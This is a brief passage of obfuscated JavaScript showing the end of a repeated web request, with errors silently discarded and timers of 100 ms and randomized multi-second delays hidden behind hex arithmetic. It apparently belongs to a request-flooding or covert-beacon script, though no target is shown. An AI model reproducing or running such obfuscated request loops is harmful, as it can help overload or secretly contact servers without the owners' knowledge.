        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x2089 * 0x1 + 0x1 * -0x2be5 + 0x26b4) * getRandomInt(0x1d3 * 0x11 + -0x1 * 0x1c59 + -0x2a9, -0x44f * -0x2 + 0x43 * -0x1 + 0x16 * -0x61));
}, 0x1 * 0x14e9 + 0xa3 * -0x4 + -0x11f9);